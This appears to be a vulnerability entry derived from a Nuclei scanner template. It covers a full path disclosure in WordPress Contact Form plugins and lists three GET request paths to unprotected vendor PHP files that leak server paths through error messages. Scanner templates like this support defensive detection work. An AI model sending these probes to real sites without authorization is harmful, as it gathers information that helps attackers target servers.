# Vulnerability: WordPress Contact Form - Full Path Disclosure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-contact-form-fpd.yaml`)

## Description
WordPress Contact Form plugin files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/flamix-bitrix24-and-contact-forms-7-integrations/includes/vendor/mobiledetect/mobiledetectlib/export/exportToJSON.php
GET {{BaseURL}}/wp-content/plugins/cf7-salesforce/vendor/mobiledetect/mobiledetectlib/export/exportToJSON.php
GET {{BaseURL}}/concrete/vendor/mobiledetect/mobiledetectlib/export/exportToJSON.php
```

